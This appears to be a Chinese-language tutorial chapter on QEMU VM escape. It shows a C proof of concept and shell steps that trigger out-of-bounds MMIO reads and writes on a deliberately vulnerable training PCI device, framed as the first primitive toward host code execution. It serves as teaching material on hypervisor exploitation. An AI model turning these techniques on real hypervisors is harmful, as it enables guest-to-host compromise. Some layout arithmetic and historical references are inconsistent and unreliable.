# Ch 16 — 第一個 device bug：MMIO OOB read/write

> **目標**：用 Ch 12 的 vuln-pci device，從 guest 端透過 MMIO 觸發 OOB read 與 OOB write，建立第一步利用原語——這是整條逃逸鏈的起點。

> **環境**：QEMU 9.0 / x86-64 / Linux host（Ubuntu 22.04/24.04），guest 為 Debian 12 / x86-64，已掛載 vuln-pci `-device vuln-pci`。

---

## 為什麼需要這個？

漏洞利用是一條需要逐步建立原語（primitive）的鏈。在 QEMU 逃逸的情境下，最終目標是在 **host userspace** 執行任意程式碼。這需要：

1. 某種讀寫能力，能讀/寫 **host 的記憶體**（不只是 guest 的）
2. 一個洩漏，把 host 端的 ASLR base 解決掉（Ch 17）
3. 一個可以劫持的 function pointer（Ch 20-21）
4. 一條 ROP 鏈（Ch 22）

OOB read/write 是步驟 1 的核心。vuln-pci 的 `buf[0x100]` 沒有邊界檢查，BAR0 的 MMIO 視窗卻是 0x1000 位元組——guest 可以存取 `buf` 後方的任意偏移，直接讀寫 **host 進程的記憶體**（因為 MMIO handler 跑在 host userspace 的 QEMU 行程裡）。

歷史上這個模式反覆出現。VENOM（CVE-2015-3456）是軟碟控制器的 OOB write；Dirty Pipe QEMU variant 是 DMA OOB；近年各大 CTF 的 QEMU 題幾乎都以某種形式的 buffer OOB 為起點。理解這個起點，就理解了大半 QEMU 逃逸的骨架。

---

## 先建立直覺

```
host userspace（QEMU 行程記憶體）
┌─────────────────────────────────────────────────────┐
│  VulnState（heap 上，g_malloc 配置）                 │
│  ┌──────────────────────────────────────────────┐   │
│  │ pdev：PCIDevice（248 bytes）                 │   │
│  │   └─ config[256]、wmask[]、cmask[]...        │   │
│  ├──────────────────────────────────────────────┤   │
│  │ mmio：MemoryRegion（含 .ops 指標！）          │   │  ← OOB 高價值標的
│  ├──────────────────────────────────────────────┤   │
│  │ buf[0x100]    ← MMIO 讀寫的合法範圍          │   │
│  │ 0x41 0x41 ...                                │   │
│  ├──────────────────────────────────────────────┤   │
│  │ status（uint32_t）                            │   │
│  └──────────────────────────────────────────────┘   │
│                                                     │
│  鄰接 heap 物件（g_malloc 分配的其他結構）            │
│  ┌──────────────────────────────────────────────┐   │
│  │  ...任意 QEMU 內部物件...                     │   │
│  └──────────────────────────────────────────────┘   │
└─────────────────────────────────────────────────────┘

guest 視角：
  BAR0 GPA base = 0xfe000000（BIOS 分配，實際值查 lspci）
  MMIO offset 0x00       → status 暫存器
  MMIO offset 0x04~0x103 → buf[0x00]~buf[0xff]（合法）
  MMIO offset 0x104~0xfff → buf[0x100]... OOB！→ 讀/寫 host 記憶體
```

OOB read 和 OOB write 的後果截然不同：

| 操作 | 手段 | 直接後果 | 利用目的 |
|------|------|---------|---------|
| OOB read | 讀 MMIO offset > 0x103 | 讀到 `buf` 後方的 host 記憶體 | infoleak：洩漏指標，破解 ASLR |
| OOB write | 寫 MMIO offset > 0x10 + 0xff | 覆蓋 `buf` 後方的 host 記憶體 | 破壞相鄰物件、覆蓋 function pointer |

---

## 從 guest 存取 BAR0：mmap resource0

PCI device 的 MMIO 區域在 Linux guest 透過 `/sys/bus/pci/devices/` 暴露為 `resource0`（BAR0 對應 resource0，BAR1 對應 resource1，依此類推）。

### 定位 vuln-pci

```bash
# guest 內執行
lspci | grep 1234
# 輸出範例：00:04.0 Unclassified device [ff00]: Device 1234:5678

# 取得 BDF（Bus:Device.Function）
BDF="0000:00:04.0"

# 查 BAR0 的 GPA base 與 size
cat /sys/bus/pci/devices/$BDF/resource
# 第一行：0x00000000fe000000 0x00000000fe000fff 0x0000000000040200
#          ↑ BAR0 start GPA   ↑ BAR0 end GPA      ↑ flags（I/O type）
```

BAR0 的 start/end 告訴你 GPA 範圍（0xfe000000 到 0xfe000fff，大小 0x1000）。這個值每次 QEMU 啟動可能不同，必須動態讀取。

### mmap resource0

```c
/* 未實測，理論預期。在 Ubuntu guest + 自編 QEMU 環境下驗證。 */
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/mman.h>
#include <stdint.h>
#include <string.h>

#define BAR0_SIZE   0x1000
#define REG_STATUS  0x00
#define REG_BUF_RD  0x04   /* buf 讀基底；addr - 0x04 = buf index */
#define REG_BUF_WR  0x10   /* buf 寫基底；addr - 0x10 = buf index */

static void    *bar0;

static void mmio_write8(uint64_t offset, uint8_t val) {
    *(volatile uint8_t *)(bar0 + offset) = val;
}

static uint8_t mmio_read8(uint64_t offset) {
    return *(volatile uint8_t *)(bar0 + offset);
}

static uint32_t mmio_read32(uint64_t offset) {
    return *(volatile uint32_t *)(bar0 + offset);
}

int main(void)
{
    /* 1. 開啟 resource0 */
    int fd = open("/sys/bus/pci/devices/0000:00:04.0/resource0",
                  O_RDWR | O_SYNC);
    if (fd < 0) { perror("open resource0"); return 1; }

    /* 2. mmap：MAP_SHARED + 不帶 offset，直接映射整個 BAR0 */
    bar0 = mmap(NULL, BAR0_SIZE, PROT_READ | PROT_WRITE,
                MAP_SHARED, fd, 0);
    if (bar0 == MAP_FAILED) { perror("mmap"); return 1; }

    printf("[*] bar0 mapped at guest vaddr %p\n", bar0);

    /* 3. 讀 status 暫存器（合法存取） */
    uint32_t status = mmio_read32(REG_STATUS);
    printf("[*] status = 0x%x\n", status);

    /* 4. 讀 buf[0]（合法存取，offset = 0x04） */
    uint8_t b0 = mmio_read8(REG_BUF_RD + 0);
    printf("[*] buf[0] = 0x%02x\n", b0);   /* 預期 0x41（memset 初始化） */

    /* 5. OOB read：offset 超出 buf 範圍（offset = 0x04 + 0x100 = 0x104） */
    uint8_t oob_byte = mmio_read8(REG_BUF_RD + 0x100);
    printf("[*] OOB read buf[0x100] = 0x%02x  ← 讀到 buf 後方的 host 記憶體\n",
           oob_byte);

    /* 6. OOB write：覆蓋 buf[0x100] 後方（offset = 0x10 + 0x100 = 0x110） */
    printf("[*] OOB write: writing 0xde to buf[0x100]...\n");
    mmio_write8(REG_BUF_WR + 0x100, 0xde);

    /* 驗證：讀回剛寫的位元組 */
    uint8_t verify = mmio_read8(REG_BUF_RD + 0x100);
    printf("[*] verify OOB byte = 0x%02x  ← 預期 0xde\n", verify);

    munmap(bar0, BAR0_SIZE);
    close(fd);
    return 0;
}
```

**驗證步驟（Linux guest）**：

```bash
# 1. 確認 vuln-pci 可見
lspci | grep 1234

# 2. 啟用 MMIO 資源（kernel 可能預設 disable 未知 vendor）
echo 1 > /sys/bus/pci/devices/0000:00:04.0/enable

# 3. 編譯並以 root 執行（mmap /sys/bus/pci/... 需要 CAP_SYS_RAWIO 或 root）
gcc -O0 -o oob_poc oob_poc.c
sudo ./oob_poc
```

---

## 底層機制：MMIO dispatch 到 vuln_mmio_read/write

```
guest CPU 執行 MOV [BAR0+0x104], AL
         │
         │ EPT violation（GPA 0xfe000104 不在 EPT 中，或標為 MMIO）
         ▼
KVM：VMEXIT（exit reason = EPT_VIOLATION / IO_INSTRUCTION）
         │
         │ kvm_run 回到 QEMU userspace
         ▼
QEMU softmmu：address_space_dispatch()
  → 查 MemoryRegion 樹，找到 BAR0 region（GPA 0xfe000000，size 0x1000）
  → 計算 offset = 0xfe000104 - 0xfe000000 = 0x104
  → 呼叫 mr->ops->write(opaque, 0x104, val, 1)
         │
         ▼
vuln_mmio_write(opaque=VulnState*, addr=0x104, val=0xde, size=1)
  → addr >= VULN_REG_BUF_WRITE（0x10）→ 是
  → idx = 0x104 - 0x10 = 0xf4
  → s->buf[0xf4] = 0xde       ← 注意：0xf4 < 0x100，這個還在合法範圍
  （要真正 OOB 需要 idx >= 0x100，即 addr >= 0x10 + 0x100 = 0x110）

真正的 OOB write：addr = 0x110
  → idx = 0x110 - 0x10 = 0x100
  → s->buf[0x100]              ← BUG：超出 buf[0x100] 邊界！
  → 實際寫到 VulnState 裡 buf 後方的欄位（status 或更後面的記憶體）
```

**重點**：`vuln_mmio_read` 的 buf 讀取以 `VULN_REG_BUF_READ = 0x04` 為基底，`vuln_mmio_write` 以 `VULN_REG_BUF_WRITE = 0x10` 為基底——兩個 offset 不同，OOB 的觸發點計算要分開。

### VulnState 記憶體佈局（近似，64-bit host）

```
struct VulnState {
  offset 0x000: PCIDevice pdev            ← ~248 bytes（含 config[256]、名稱等）
  offset 0x0f8: MemoryRegion mmio         ← sizeof(MemoryRegion) ≈ 176 bytes（QEMU 9.0）
                  .addr   (hwaddr)
                  .size   (uint64_t)
                  .ops    (const MemoryRegionOps *)  ← 高價值指標
                  ...
  offset 0x1a8: char buf[0x100]           ← 讀寫合法範圍
  offset 0x2a8: uint32_t status
}
```

> **注意**：上面的 offset 是概算。實際值視 PCIDevice 與 MemoryRegion 的 sizeof 而定，且 gcc 可能插入 padding。用 `pahole -C VulnState ./qemu-system-x86_64` 或 gdb `p sizeof(PCIDevice)` 取精確值。

OOB 讀/寫從 `buf[0x100]` 往上打，第一個遇到的是 `status`；繼續往上（相對於 buf 的「後方」是結構體外的 heap）會打到 glibc malloc 的 chunk header，再往後是鄰接的 heap object。

---

## 對比與取捨

| 維度 | OOB read | OOB write |
|------|---------|---------|
| 目的 | 洩漏 host 指標（ASLR bypass） | 破壞鄰接物件（覆蓋 func ptr） |
| 危險性 | 通常不立即崩潰，可多次探測 | 很容易崩潰（改壞 metadata） |
| 順序 | **先做** | **後做**（需先知道要寫多遠） |
| 需要 heap layout 知識 | 少：只需知道哪裡有指標 | 多：需要精確 offset、需要 grooming |
| 精度要求 | 低：byte-by-byte 探測即可 | 高：差一個 byte 可能把 chunk size 寫壞 |

先做 OOB read（Ch 17 infoleak），再做 OOB write（Ch 18 heap overflow）。這個順序是固定的——如果你在不知道 ASLR base 的情況下寫一個隨機的假指標，QEMU 崩潰、這次機會報廢。

---

## 踩雷集錦

**雷 1：resource0 的 mmap 需要 root + `O_SYNC`**

直覺：MMIO 就是記憶體，普通 mmap 就好。
實際：`/sys/bus/pci/devices/.../resource0` 是 MMIO 裸映射，需要 `CAP_SYS_RAWIO`（通常 root），且必須帶 `O_SYNC` 打開才能讓 CPU 對每次存取都生成真實的 bus transaction，不被 CPU cache 攔截。不帶 `O_SYNC` 的讀寫可能命中 CPU write buffer，完全不會觸發 QEMU handler。

**雷 2：OOB offset 計算要區分 read base 和 write base**

直覺：超過 0x100 就是 OOB。
實際：read 的 buf 基底是 `0x04`，所以觸發 OOB read 的 offset 是 `>= 0x04 + 0x100 = 0x104`；write 的 buf 基底是 `0x10`，觸發 OOB write 的 offset 是 `>= 0x10 + 0x100 = 0x110`。算錯會在合法範圍內打轉。

**雷 3：VulnState 內部的 OOB 和 heap OOB 是兩個不同區域**

直覺：OOB 就是打 heap。
實際：`buf` 之後先是 `status`（VulnState 內部），然後才是結構體外的 heap。`buf[0x100]` 是 `status` 的第一個 byte，`buf[0x104]` 才開始打到 struct 以外。這段 VulnState 內部的 OOB 同樣危險（比如把 `status` 改成亂值可能觸發意外的 DMA），但不等於打到 heap 鄰接物件。

**雷 4：並非所有 OOB read 都能讀到有用指標**

直覺：只要 OOB read 到後方就會有指標。
實際：`buf` 之後的 `status` 只有 4 bytes 整數。真正有用的指標（`MemoryRegion.ops`、heap 指標）在 **buf 之前**（mmio 結構體），或在 VulnState **之外的 heap chunk**。這取決於 `buf` 在 VulnState 內的相對位置。用 `pahole` 確認結構佈局後再算 offset，不要憑直覺猜。

**雷 5：QEMU 沒有立即崩潰不代表 OOB 沒成功**

直覺：如果 QEMU 沒 crash，說明沒打到。
實際：OOB read 幾乎不崩潰（只是讀了一個不預期的 byte）；OOB write 如果打到的位置是 padding 或未使用欄位，也可能靜默成功。崩潰是打壞了重要的 metadata（如 malloc chunk size、已被釋放的指標）。不崩潰 ≠ 沒 OOB。

---

## 進階：再往深一層

### 為什麼 BAR0 size 是 0x1000 而非 0x100？

PCI spec 要求 BAR 的大小必須是 2 的冪次，且通常最小 4KB（0x1000）。device 向 BIOS 宣告「我需要 N bytes MMIO 空間」的方式是把 BAR 暫存器寫入全 1 然後讀回，BIOS 根據讀回值的對齊判斷 size（這個過程叫 BAR sizing）。

`vuln-pci` 在 `memory_region_init_io` 傳入 `0x1000` 作為 size——這就是 BIOS 看到的大小。guest mmap 到的視窗是 0x1000 bytes，所以 offset 最大可到 0xfff，而 `buf` 只有 0x100 bytes，OOB 空間是 0xffb bytes（足夠打到大量相鄰結構）。

### address_space_read/write 的角色

當 DMA（Ch 13）發生時，device 用 `address_space_read()`/`address_space_write()` 把資料搬進/搬出 guest 記憶體。這和 MMIO OOB 的路徑不同——MMIO OOB 的角色是讀寫 **host** 記憶體（相對 VulnState 的 OOB），DMA OOB 的角色是讀寫 **guest** 記憶體（超出 guest 分配的 DMA buffer）。兩者在利用鏈上可以搭配——先用 MMIO OOB leak，再用 DMA 搬 ROP 鏈到 guest 端備用。

### 從 gdb 觀察 host 端

```bash
# host 端 attach QEMU
gdb -p $(pgrep qemu-system-x86)

# 在 vuln_mmio_write 設斷點
(gdb) break vuln_mmio_write
(gdb) commands
  > p addr
  > p val
  > p idx
  > continue
  > end

# guest 端跑 oob_poc，host 端 gdb 會在每次 MMIO write 時停下
# 觀察 addr=0x110 時 idx=0x100（OOB）
```

這個「guest 動、host gdb 停」的手感是 VM escape 攻防的核心節奏——建議每次寫 PoC 都同時開兩端觀察。

### OOB 空間的數學：BAR size、buf size、實際可達範圍

```
BAR0 size:      0x1000（4096 bytes）
buf size:       0x100（256 bytes）
read base:      VULN_REG_BUF_READ  = 0x04
write base:     VULN_REG_BUF_WRITE = 0x10

OOB read 可達範圍：
  MMIO offset 0x04 ~ 0xfff
  buf index   0x00 ~ 0xffb
  超出合法 buf 的 OOB 部分：index 0x100 ~ 0xffb（共 0xefc = 3836 bytes）

OOB write 可達範圍：
  MMIO offset 0x10 ~ 0xfff
  buf index   0x00 ~ 0xfef
  超出合法 buf 的 OOB 部分：index 0x100 ~ 0xfef（共 0xef0 = 3824 bytes）

VulnState 大小（概算）：~0x390 bytes（pahole 確認）
VulnState 後方可達：0xefc - (sizeof(VulnState) - offsetof(buf) - sizeof(buf))
                   = 0xefc - 0x004（status 4 bytes）≈ 0xef8 bytes

換句話說：OOB 可以打到 VulnState 後方約 3.7KB 的 heap 空間——
足夠覆蓋多個鄰接的 heap chunk（每個 chunk 通常 ~0x100~0x400 bytes）。
```

OOB 空間充裕是 vuln-pci 設計上的刻意選擇，讓攻擊的靈活度大：不需要目標物件緊鄰 VulnState，也不需要非常精確的 grooming 才能打到。在真實 CVE 中，OOB 空間可能小很多（比如 VENOM 的 FIFO 只比合法範圍多溢出幾個 bytes），這時 grooming 的精確度要求就高很多。

---

## 動手練習

1. **定位 vuln-pci**：在 guest 執行 `lspci -v` 找到 `1234:5678`，記下 BDF 和 BAR0 GPA 範圍。確認 BAR0 size 為 0x1000。

2. **mmap + 合法讀寫**：寫一個 C 程式 mmap BAR0，讀 `status`（offset 0x00），讀寫 `buf[0]`~`buf[0xff]`（合法範圍）。在 host gdb 確認 `vuln_mmio_read`/`vuln_mmio_write` 被呼叫到。

3. **觸發 OOB read**：讀 MMIO offset `0x104`（buf[0x100]）。觀察返回值——這是 `VulnState.status` 的第一個 byte。再讀 `0x108`，比對 `status` 全值。

4. **觸發 OOB write**：寫 MMIO offset `0x110`（覆蓋 buf[0x100]，即 `status` 的第一個 byte）。用 host gdb `p s->status` 確認值被改變。**小心不要覆蓋到 MemoryRegion.ops——那會立刻崩潰。**

5. **用 pahole 確認佈局**：在 host 執行 `pahole -C VulnState ./qemu-system-x86_64`（需要 debug symbol），確認 `buf` 和 `mmio` 的實際 offset，與本章的概算對比。

---

## 本章重點整理

- guest 對 BAR0 的 MMIO 存取透過 EPT violation → KVM VMEXIT → QEMU `vuln_mmio_read/write` 呼叫鏈路由到 device handler。
- vuln-pci 的 `buf[0x100]` 讀/寫都沒有 bound check；BAR0 視窗 0x1000 bytes 提供巨大的 OOB 空間。
- **OOB read** 讀到 host 記憶體（VulnState 後方），是 infoleak 的原語來源。
- **OOB write** 覆蓋 host 記憶體，是破壞相鄰物件 / function pointer 的手段。
- 正確操作順序：先 OOB read（leak）→ 再 OOB write（破壞），不能顛倒。
- guest 存取 BAR0 透過 `/sys/bus/pci/devices/.../resource0` + `mmap`，需要 root + `O_SYNC`。
- `pahole` + host gdb 是確認實際結構佈局的標準工具，不能憑直覺猜 offset。

---

## 自我檢核

- [ ] 說出 MMIO 存取從 guest CPU 到 `vuln_mmio_write` 的完整路徑（不看文章）
- [ ] 解釋 OOB read 和 OOB write 的觸發 offset 為何不同（read base 0x04 vs write base 0x10）
- [ ] 說明為何 OOB read 先、OOB write 後這個順序是必要的
- [ ] 說出 `buf[0x100]` 對應 VulnState 內哪個欄位（`status`），而不是 heap 鄰接物件
- [ ] 解釋 `/sys/bus/pci/devices/.../resource0` 的 `O_SYNC` 為何必要

---

## 延伸閱讀

1. **QEMU `hw/misc/edu.c`**（[QEMU GitLab](https://gitlab.com/qemu-project/qemu/-/blob/master/hw/misc/edu.c)）
   - 讀哪裡：整個檔案，重點看 `edu_mmio_read`/`edu_mmio_write` 和它的 bound check（與 vuln-pci 的 no-check 對比）。
   - 學什麼：合法 device 的 MMIO handler 長什麼樣；`edu.c` 的 DMA 設計是後面章節的重要參照。
   - 關聯：本章 vuln-pci 的骨架就來自 edu.c，對比閱讀最有效率。

2. **「QEMU PCI Device Implementation」（QEMU 開發者文件）**（[qemu.org/docs/master/devel/pci.html](https://www.qemu.org/docs/master/devel/pci.html)）
   - 讀哪裡：BAR 註冊、MemoryRegion API、`pci_register_bar` 說明。
   - 學什麼：BAR sizing 的 PCI spec 機制；為什麼 BAR size 必須是 2 的冪次。
   - 關聯：解釋本章「BAR0 size 0x1000」的協定面根據。

3. **VENOM（CVE-2015-3456）原始公告與 patch**（[CrowdStrike blog](https://www.crowdstrike.com/blog/venom-vulnerability-details/)）
   - 讀哪裡：CrowdStrike 的原始公告，以及 QEMU commit `9a3400b` 的 patch diff。
   - 學什麼：史上最著名的 QEMU OOB write——軟碟控制器的 FIFO buffer 沒有 bound check，和本章的 buf 概念完全相同；patch 只是加了一行長度檢查。
   - 關聯：Ch 23 會完整復刻 VENOM；本章先建立直覺。

4. **「Playing with ptrace」系列 + `/proc/pid/mem` 寫法**（[lwn.net](https://lwn.net/Articles/478628/)）
   - 讀哪裡：LWN 的 ptrace 介紹，以及 `/proc/pid/mem` 的文件（`man 5 proc`）。
   - 學什麼：理解 host 行程記憶體的結構（heap、text、stack）；OOB 讀到的 byte 怎麼對應到這些 segment。
   - 關聯：Ch 17 infoleak 需要你知道 QEMU PIE 的記憶體 layout 才能解算 base 地址。

5. **「2016 CTF QEMU Escape Writeup」by Mehmet Ince（Phrack 或 CTFtime）**
   - 讀哪裡：找任何一篇 DEF CON CTF 或國際賽的 QEMU custom device 逃逸 writeup（關鍵字：`qemu escape ctf writeup buffer overflow`）。
   - 學什麼：真實 CTF 題如何把 MMIO OOB 組裝成完整逃逸鏈；PoC 程式碼的實際形態。
   - 關聯：本章是那條鏈的第一步；從 writeup 往回看更能感受「每個 primitive 的用途」。

---

> 現在你手上有了第一個 primitive：能從 guest 讀/寫 host 的記憶體（相對 `buf` 的任意偏移）。下一步是把這個 OOB read 轉化成有用的 infoleak——知道哪裡有指標、讀出來、計算出 QEMU PIE base 和 heap base，才能讓後面的 OOB write 打到正確的目標。

→ [Ch 17 — infoleak：洩漏 QEMU PIE base 與 heap 位址](./17-infoleak.md)
